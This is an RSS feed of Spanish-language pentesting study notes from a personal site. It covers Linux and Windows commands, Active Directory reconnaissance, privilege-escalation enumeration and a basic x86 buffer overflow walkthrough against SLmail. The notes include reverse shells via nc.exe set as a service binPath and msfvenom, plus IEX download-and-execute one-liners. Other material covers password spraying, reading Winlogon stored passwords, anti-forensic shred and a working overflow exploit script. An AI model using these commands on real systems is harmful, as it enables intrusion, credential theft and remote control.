Para cortar la palabra que está justo después del cursor.

<br>

Hacer que el cursor avance un carácter. 

<br>

Hacer que el cursor retroceda un carácter.

<br>

Cortar todo el contenido desde la posición actual del cursor hasta el inicio de la línea.

<br>

Cortar todo el contenido desde la posición actual del cursor hasta el final de la línea. 

<br>

Para cortar la palabra que está justo antes del cursor. 

<br>

Para borrar el carácter que está justo después del cursor. 

<br>

Para borrar el carácter que está justo antes del cursor.

<br>

Limpiar la pantalla de la terminal. 

<br>

Intercambia la posición de las 2 palabras antes del cursor. 

<br>

Cambiar de minúsculas a mayúsculas desde la posición del cursor hasta el siguiente espacio 

<br>

Cambiar de mayúsculas a minúsculas desde la posición del cursor hasta el siguiente espacio.

<br>

Mostrar en pantalla la última palabra del último comando ejecutado.

<br>

Copiar y pegar contenido de la consola. 

]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/linux/atajos-de-consola.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Linux/Atajos de consola.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 27 Feb 2024 19:06:45 GMT</pubDate></item><item><title><![CDATA[Commands]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:comandos" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#comandos</a> <a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:comandos" class="tag" target="_blank" rel="noopener nofollow">#comandos</a> <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a>
<br><br><br>impacket-smbserver -smb2support -unsername {username} -password {pass} {folder_name}{path}
# Crear un recurso compartido a nivel de red (SMB)
# Ahora desde la linux, creariamos una nueva unidad logica, con 
&gt; net use x: \\{own_ip}\{folder_name} /user:{username} {pass}
# Usar una nueva particion (x) como enlace de nuestro recurso compartido smb de la linux
&gt; net use x: /delete
# Eliminar el recuso compartido 
&gt; dir x:\ 
# Listar el recurso compartido de nuestra maquina linux
&gt; copy {file} x:\{newFile}
# De esta manera copiamos un file de nuestra maquina windows y lo subimos a nuestra maquina linux bajo el nomber que elijamos

getfacl {file}
# Listar y ver permisos especiales de un archivo
df -h 
# Listar sistema de particionado 
touch -- '-e sh {file}'
# Crear un archivo con nombre de '-e sh {file}'
shred -zun 10 -v payload.php
# Eliminar archivos para evitar tecnicas de forense 
pushd /path 
# Lo que hace es moverte al path ingresado como cd, permitiendote con el comando popd....
popd
# Volver al path desde el que se hizo pushd 
rlwrap
# Sirve para permitirnos usar el CTRL + L y demás 
strings {binario}
# listar cadenas de un binario
strings -e l {binario}
# Ver cadenas adicionales 
lsb_release -a
# Comprobar el codename del sistema
cat /etc/os-release
# Si no existe e lsb_release -a 
upx {script.go}
# Reducir el tamaño de un script 
updatedb 
# Actualizar la busqueda para el locate
go build -ldflags "-s -w" . 
upx {bin}
# Compilar archivo de go al menor peso posible 
nc -nlvp {port} &lt; {file}
# Compartir un archivo por un puerto determinado
cat &lt; /dev/tcp/{ip}/{port} &gt; {name_file}
# Obtener el archivo compartido anteriormente y alojarlo bajo un nombre 
cd `bd {name}`
# Esto se usa para ir a un directorio ubicado atras, por ejemplo si estamos en /home/kali/Desktop/pivoting/network  
# y queremos ir a kali, podríamos hacer cd `bd kali` en lugar de cd ../../../..
ls -l /etc/systemd/system 
ls -l /etc/init.d
# Demonios o Servicios que pueden llegar a ser interesantes
echo "data" | awk 'NF{print $NF}' FS="/"
# Filtrar por último valor tomando un delimitador
echo "data" | awk -F'/' 'NF{for(i=1;i&lt;NF;i++) printf "%s/", $i}'
# Filtrar por todos los valores previos menos el último valor
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/linux/commands.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Linux/Commands.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 27 Feb 2024 00:15:42 GMT</pubDate></item><item><title><![CDATA[Active Directory Recon]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> <a class="tag" href="https://dobliuw.com/?query=tag:AD" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#AD</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a> <a href="https://dobliuw.com?query=tag:AD" class="tag" target="_blank" rel="noopener nofollow">#AD</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>El Active Directory (Directorio Activo) es un servicio de directorio desarrollado por Microsoft que se utiliza para almacenar y organizar información soblre los recursos de red, como usuarios, grupos, equipos y políticas de seguridad. Proporciona un conjunto de servicios de directorio centralizados y un marco de administración para gestionar los recusos de red en un entorno de dominio de Windows. <br><br><br>El reconocimiento en Active Directory es una práctica esencial en la gestión de sistemas y la seguridad de la información en entornos empresariales basados en Windows.<br>
A su vez, el AD utiliza varios puertos y protocolos para su funcionamiento, dentro de estos se encuentas ldap, Kerberos, DNS, RPC, SMB, entre otros, por lo que es muy importante tener en cuenta la <a data-href="Enum. Kerberos 88" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-kerberos-88.html" class="internal-link" target="_self" rel="noopener nofollow">Enum. Kerberos 88</a>, <a data-href="Enum. LDAP 389 &amp; 636 - ( Lighweight Directory Access Protocol )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-ldap-389-&amp;-636-(-lighweight-directory-access-protocol-).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. LDAP 389 &amp; 636 - ( Lighweight Directory Access Protocol )</a>, <a data-href="Enum. DNS 53 - (Domain Name System)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-dns-53-(domain-name-system).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. DNS 53 - (Domain Name System)</a>, <a data-href="Enum. RPC 135 - ( Remote Procedure Call )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-rpc-135-(-remote-procedure-call-).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. RPC 135 - ( Remote Procedure Call )</a>, <a data-href="Enum. SMB 445 - (Server Message Block)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-smb-445-(server-message-block).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. SMB 445 - (Server Message Block)</a>. <br>A continuación se indican múltiples técnicas a tener en cuenta de cara a el reconocimiento de un AD.<br><br>crackmapexec smb {target_ip} -u {users.txt} -p '{password}' -d {domain} --continue-on-success

kerbrute passwordspray -d {domain} --dc {target_ip} {users.txt} '{password}'
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/active-directory/reconocimiento/active-directory-recon.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Windows/Active Directory/Reconocimiento/Active Directory Recon.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 23:02:57 GMT</pubDate></item><item><title><![CDATA[Active Directory (Directorio Activo)]]></title><description><![CDATA[ 
 <br><img alt="Pasted image 20230302212154.png" src="https://dobliuw.com/lib/media/pasted-image-20230302212154.png"><br><br><br>El Active Directory (Directorio Activo) es un servicio de directorio desarrollado por Microsoft que se utiliza para almacenar y organizar información soblre los recursos de red, como usuarios, grupos, equipos y políticas de seguridad. Proporciona un conjunto de servicios de directorio centralizados y un marco de administración para gestionar los recusos de red en un entorno de dominio de Windows. <br><br><br>El Domain Controler (DC) es un servidor de Windows que alberga una base de datos de Active Directory y rpoporciona servicios de autenticación, autorización y resolución de nombres en un dominio. El controlador es responsable de la administración y replicación de la base de datos de Active Directory. <br><br><br>Las cuentas de servicio son cuentas de usuario especiales que se utilizan para ejecutar servicios o aplicaciones en un sistema operativo. Estas cuentas están diseñadas para interactucar con el sistema y los recursos de red de manera automatizada, sin necesidad de una interacción directa con un usuario. Las cuentas de servicios suelen tener privilegios y derechos específicos para acceder a los recursos necesarios para us funcionamiento. <br><br><br>Las GMSA son un tipo de cuenta de servios específica de Windows administradas por grupos, lo que significa que están asociadas a un grupo en lugar de a una cuenta de usuario individual. Proporcionan una solución de administración de contraseñas más segura para servicios y apliaciones, ya que las contraseñas son generadas y administradas automáticamente por el controlador de dominio (DC).<br><br><br>Los SPN son identificadores únicos asociados a un servicio específico que se ejecuta en una cuenta de servicios. Se utilizan para identificar de manera exclusiva a un servicio en la red y permitir la autenticación mutua entre clientes y servicios. Los SPN son especialmente relevantes en entornos de Kerberos, donde se utilizan para la autenticación segura.<br><br><br> Kerberos es un protocolo de autenticación utilizado en Active Directory para proporcionar autenticación segura en entornos de red. Kerberos utiliza tickets de seguridad (TGT y TGS) para verificar la identidad de los usuarios y permitirles acceder a los recursos de red de manera segura. <br>Flujo de autenticación de Kerberos: <a data-href="KERBEROS_AUTHETICATION_FLOW" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html" class="internal-link" target="_self" rel="noopener nofollow">KERBEROS_AUTHETICATION_FLOW</a><br><br><br>Los grupos en Active Directory se utilizan para organizar usuarios, equipos y otros objetos en categorías lógicas. Los grupos permiten una administración más eficiente al aplicar permisos y políticas de seguridad de manera colectiva. Las Unidades Organizativas (OU) son contenedores lógicos que se utilizan para organizar objetos en la estructura jerárquica de Active Directory. <br><br><br>Las políticas de grupo son configraciones y directivas de seguridad que se pueden aplicar a usuarios y equipos dentro de un dominio. Estas políticas permiten controlar y gestionar diversos aspectos del entorno, como permisos, configuraciones de seguridad, restricciones de acceso, configuraciones de escritorio, entre otros. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/active-directory/active-directory.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Windows/Active Directory/Active Directory.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:06 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230302212154.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230302212154.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Commands]]></title><description><![CDATA[ 
 <br><img alt="Pasted image 20230215173659.png" src="https://dobliuw.com/lib/media/pasted-image-20230215173659.png"><br><br><br># Mostrar archivos ocultos en el directorio actual
dir /AH
# Buscar archivos en el sistema desde el directorio actual
&gt; dir /r /s {name}
# Realizar una lectura del contenido de un archivo 
&gt; type {file}
# Migrar a usuarios 
&gt; cacls 
# Analizar los permisos de un archivo 
Copy<br><br>certutil.exe -f -urlcache -split {url/file} {file}
# Descargar un archivo desde una url y depositarlo 
Copy<br><br># Al tener credenciales, podriamos intentar ejecutar comandos con ese usuario para poder entablarnos una revershell
&gt; $user = '{domain}\{name}'
# Guardamos en la variable user, el nombre del usuario
&gt; $password = ConvertTo-SecureString '{password}' -AsPlainText -Force
# Guardamos en la variable password lo contraseña, ya que en texto claro nos traeria problemas.
&gt; $cred = New-Object System.Management.Automation.PSCredential($user, $password)
# Creamos la credencial en la variable cred.
&gt; Invoke-Command -ComputerName {computer_name} -Credential $cred -ScriptBlock { "command" }
Copy<br><br>
&gt; sc.exe create foo binPath="C:\Users\Dobliuw\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
Copy<br><br>
&gt; sc.exe config VMTools binPath="C:\Users\dobliuw\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
Copy<br><br>&gt; sc.exe start {service}

&gt; sc.exe stop {service}
Copy<br><br>&gt; Invoke-WebRequest 'http://{dominio}/{recurso}' -OutFile ''

&gt; iwr -uri 'http://{dominio}/{recurso}' -OutFile '{name}'
Copy<br><br>&gt; Set-ExecutionPolicy Bypass -Scope Process
Copy<br><br>&gt; IEX(New-Object Net.WebClient).downloadString('http://{dominio}/{recurso}')
Copy<br><br>&gt; Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultDomainName, DefaultUserName, DefaultPassword
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/commands.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Windows/Commands.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 14:51:45 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215173659.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215173659.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Recopilación de información del sistema.]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Una vez probados todos los <a data-href="Intentos Básicos" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/intentos-básicos.html" class="internal-link" target="_self" rel="noopener nofollow">Intentos Básicos</a> para ver si encontramos una vía potencial de escalar privilegios y que está no de resultados, podríamos intentar realizar una recopilación exhaustiva de información del sistema con herramientas automatizadas como <a data-tooltip-position="top" aria-label="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">winPEAS.exe</a> así como con la realización de base de datos de grafos con información del sistema. <br><br><br> Neo4j es un software libre de Base de datos orientada a grafos, implementado en Java el cual podremos utilizar junto a Bloohound, una herramienta visor gráfico que tiene como objetivo realizar un mapeo de todas las relaciones, configuraciones en un Dominio de Windows siendo utilizando para identificar las rutas que pueden ser complejas para identificar, falencias de configuración de usuarios y políticas. <br>sudo apt install neo4j bloodhound 
Copy<br>Una vez instaladas las herramientas, es importante tener en cuenta que se necesita la version de java 11 para que neo4j funcione correctamente. <br>sudo update-alternatives --config java
Copy<br> Una vez seleccionada la versión 11 de java, podríamos dar comienzo a la realización de nuestra base de datos.<br>neo4j console &amp;&gt;/dev/null &amp; disown
Copy<br>Una vez ejecutado el comando, se nos levantará un puerto (7474) en donde tendremos una interfaz gráfica en la web, donde deberémos configurar nuestras credenciales de la base de datos, por default las credenciales son neo4j:neo4j. <br>Una vez configurada nuestra contraseña, habría que ejecutar el comando: <br>bloodhound &amp;&gt;/dev/null &amp; disown 
Copy<br>Ahora solo quedaría recopilar la información del sistema windows, en caso de tener una powershell podríamos hacer uso de la herramienta <a data-tooltip-position="top" aria-label="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1" rel="noopener nofollow" class="external-link" href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1" target="_blank">sharphound.psq</a>,  una vez descargada esta herramienta, solo habría que subirla a la máquian víctima y ejecutarlo <br>Para ver como se ejecuta el scrip, desde nuestra máquina linux: <br>cat Sharphound.ps1 | grep function # Output -&gt; Invoke-Bloodhound
cat Sharphound.ps1 | grep "Invoke-Bloodhound"
Copy<br>Una vez que sepamos como se hace para ejecutar el script: <br>&gt; Import-Module .\Sharphound.ps1
&gt; Invoke-Module -CollectionMethod All
Copy<br> Este último comando creara un comrpimido .zip con la información del sistema le cual deberemos descargar para posteriormente subir a la interfaz del bloodhound.<br>
Una vez subida la información a bloodhound, está herramienta nos podrá ayudar a detectar posibles rutas para escalar privilegios, entre otras cosas.<br><br><br>La herramienta <a data-tooltip-position="top" aria-label="https://github.com/fox-it/BloodHound.py" rel="noopener nofollow" class="external-link" href="https://github.com/fox-it/BloodHound.py" target="_blank">Bloodhoun-python</a> es una herramienta que nos permite realizar la recopilación de información del sistema sin tener acceso al mismo, como en el caso de la creación de Base de datos de grafos con Neo4j en donde usamos el SharpHound.ps1 para la creación de un archivo .zip el cual tendremos que subir posteriormente a bloodhound. <br>git clone https://github.com/fox-it/BloodHound.py
mv BloodHound.py bloodhound-py
cd !$ 
python3 setup.py install 

mv bloodhound.py bloodhound-python

python3 blodhound-python -c All -u 'username' -p 'password' -ns {target_ip} -d {domain}
Copy<br>Esto lo que hará será crear archivos json.<br><br><br><a data-tooltip-position="top" aria-label="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" rel="noopener nofollow" class="external-link" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">PowerUp.ps1</a> es un script en powershell que se encarga de automatizar la búsqueda de posibles vías interesantes para el intento de escalada de privilegio, lo que es muy útil de cara a la recopilación de información.<br><br>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1

# Una vez descargado, podemos editarlo para realizar la invocación del mismo agregando la línea 'Invoke-AllChecks'

python3 -m http.server 80
Copy<br><br>IEX(New-Object Net.WebClient).downloadString('http://{our_uip}/PowerUp.ps1')
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/recopilación-de-información-del-sistema..html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/3. Operative Systems/Windows/Recopilación de información del sistema..md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:24:17 GMT</pubDate></item><item><title><![CDATA[Buffer Overflow básico x86]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:practico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practico</a> <a class="tag" href="https://dobliuw.com/?query=tag:ejemplificación" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ejemplificación</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:practico" class="tag" target="_blank" rel="noopener nofollow">#practico</a> <a href="https://dobliuw.com?query=tag:ejemplificación" class="tag" target="_blank" rel="noopener nofollow">#ejemplificación</a> 
<br><br><br>Para realizar un Buffer Overflow en una máquina con arquitectura de 32 bits, necesitamos un programa llamado <a data-tooltip-position="top" aria-label="https://www.immunityinc.com/products/debugger/" rel="noopener nofollow" class="external-link" href="https://www.immunityinc.com/products/debugger/" target="_blank">Immunity Debugger</a> el cual es un depurador de 32 bits para windows. Por otro lado necesitaremos un script en python llamado <a data-tooltip-position="top" aria-label="https://github.com/corelan/mona" rel="noopener nofollow" class="external-link" href="https://github.com/corelan/mona" target="_blank">mona.py</a> para automatizar y facilitar las búsquedas en el inmunity debugger, una vez descargado, este deberá ser movido a la ruta de C:\LocalFiles\InmunityInc\ImmunityDebugger\PyCommands. <br>Para practicar todo esto obviamente usamos una <a data-tooltip-position="top" aria-label="https://windows-7-home-premium.uptodown.com/windows" rel="noopener nofollow" class="external-link" href="https://windows-7-home-premium.uptodown.com/windows" target="_blank">iso de windows 7 premium</a>. <br><br><br>Para ejemplificar un caso de explotación de Buffer Overflow x86 BÁSICO se usara el windows 7 premium junto a un programa conocido por su vulnerabilidad BOF en un campo PASS el cual se llama SLmail. <br>Una vez que tengamos la aplicación desplegada, la misma nos abrirá en la maquina windows el puerto 110, por lo que nos podríamos intentar conectar con telnet o netcat para intentar ingresar los campos necesarios (USER &amp; PASS).<br>Si nos conectamos (telnet {ip} 110) e ingresamos USER dobliuw y PASS test veremos que nos arroja un error por que las credenciales no son válidas, pero de momento el programa estaría funcionando. Si nos abrimos el immunity debugger en el windows attacheando la tarea del slmail podremos ver los registros, la pila, entre otras cosas.<br>La idea es ingresar múltiples caracteres hasta producir un fallo en el programa debido a sobrescribir los valores de la pila y los registros. Una vez logrado el fallo en el mismo comenzamos con el trabajo para buscar el offset. Por lo que para todo este trabajo podemos realizar un script en python jugando con sockets.<br>#!/usr/bin/python3 

import socket
import sys 

ip = "192.168.1.34"
port = 110

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Se crea una conexión el la variable s

    s.connect((ip, port)) # Nos conectamos a la ip y el puerto dado 

    banner = s.recv(1024) # Recibimos la respuesta de 1024 bytes 
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #Envíamos la string "USER dobliuw" en formato byte y "\r\n" es una manera de simular el ENTER
        response = s.recv(1024)
        print(response)
        s.send(b"PASS " + b"A"*5000 + b'\r\n') # Envíamos la string "PASS AAAAAAAAAA...." en formato byte, siendo el 5000 la cantidad de caracteres a probar hasta generar el fallo.
        s.close()


if __name__ == "__main__":
    bof()
Copy<br>Una vez encontrado un número el cual ocasione un fallo, en este caso 5000, sabemos que al ingresar esta cantidad el programa corrompe debido a que el bufer asignado para la password es de un tamaño de caracteres menor a estos 5000, por lo que ahora hay que encontrar el offset.<br>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 
# pattern_create.rb es un scrip en rubi el cual recibe una logitud de caracteres creando así un payload para envíar. 
Copy<br>Una vez generada la cadena de bytes a enviar, simplemente tendríamos que mandarlo y ver el valor por el cual se sobrescribe el registro EIP, para luego hacer uso de otra herramienta para obtener la cantidad de caracteres previos antes de que el registro EIP se sobrescriba.<br># Si el registro EIP marca "7A46317A" debemos ingresarlo junto a un 0x al principio 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
Copy<br>Esta herramienta nos devuelve un número el cual nos indica la cantidad de caracteres previos a que se sobrescriba el valor del registro EIP. Pudiendo así saber exactamente cuando y como hacer para manipular este mismo a gusto. <br>Una vez conseguido el offset, podríamos actualizar el script: <br>#!/usr/bin/python3 

import socket
import sys 

ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"BBBB"
after_eip = b"C"*200

payload = b'PASS ' + before_eip + eip + after_eip

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #\r\n manera de simular ENTER
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()

Copy<br>Agregando 4654 "A" las cuales sobrescribren y pausan el programa, los siguientes 4 caracteres "B" pertenecerían al registro EIP y posteriormente 200 caracteres "C" para ver como se sobrescribe (En este caso, el registro ESP) <br>De esta manera deberíamos generar un  byte array, es decir todas las combinaciones posibles de bytes para posteriormente detectar los badchars. <br>Esto lo haríamos con el immunity debugger ingresando !mona para abrir el script en python y posteriormente ingresar los comandos: <br>
<br>


<br>


<br>


<br>La intención de esto, es que con todo el byte array donde en el script previamente ingresamos 200 caracteres "C" para ver que caracteres no salen representados en el stack para a la hora de crear el shellcode evitar los badchars. <br>Una vez enviado el byte array:<br># code .....
before_eip = b"A"*offset
eip = b"BBBB"
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = b'PASS ' + before_eip + eip + after_eip
# ..... code
Copy<br>Veremos en el immunity debugger donde se corrompe el payload, para que de esta manera podamos empezar a detectar los badchars, si bien podemos hacerlo manual viendo que caracteres corrompen el programa, lo podemos hacer con mona.py: <br>
<br>


<br>Esto lo que hará sera crear un archivo compare en la misma carpeta de trabajo indicada con los badchars.  De esta manera podríamos ir creando el byte array excluyendo con mona los bytes que el programa no interpreta como !mona bytearray -cpb "\x00\x{bad_char}".<br>Una vez creado el byte array con los badchars excluidos, no deberíamos tener ningún problema a la hora de ejecutar nuestro shellcode a futuro. Por lo que en este caso toca encontrar el espacio den memoria que apunte al ESP ya que no podemos apuntar directamente a este y necesitamos apuntara a un registro en memoria que se encarge de realizar un salto al ESP.<br><br>Para crear el shellcode lo podemos hacer de manera manual o con herramientas como msfvenom.<br>msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.33 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread<br>En esta caso con el -p indicamos el payload, con --plaform claramente la plataforma, con -a la arquitectura (En este caso 32bits = x86), con LHOST nuestra IP de atacante a donde queremos recibir la conexión y con LPORT el puerto, con -f el formato (Python, C, etc.), con -e el encoder a usar (En caso de tener muchos badchars y usar el shikata_ga_nai aveces no podrá encodear todo de una manera optima, en esos caso es mejor no especificar un -e y dejar que msfvenom se encarge de aplicar el más optimo), con -b los badchars y el EXITFUNC=thread es para que a la hora de terminar la conexión con la consola interactiva no mate el proceso padre (El programa vulnerable a buffer overflow) para no crashear el programa, de esta manera creamos un hilo que a la hora de salir de la consola se mantenga el servicio inicial y solo se termine el nuevo proceso hijo que se abrirá. <br>Una vez creado el shellcode, solo tendríamos que encontrar un OpCode para que podamos apuntar al ESP donde esta nuestro shellcode.<br>Para buscar el OpCode podríamos hacer uso de la herramienta nasm_shell.rb para entrar en modo interactivo :<br>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
# Una vez en modo interactivo escribimos los siguiente 
jmp ESP 
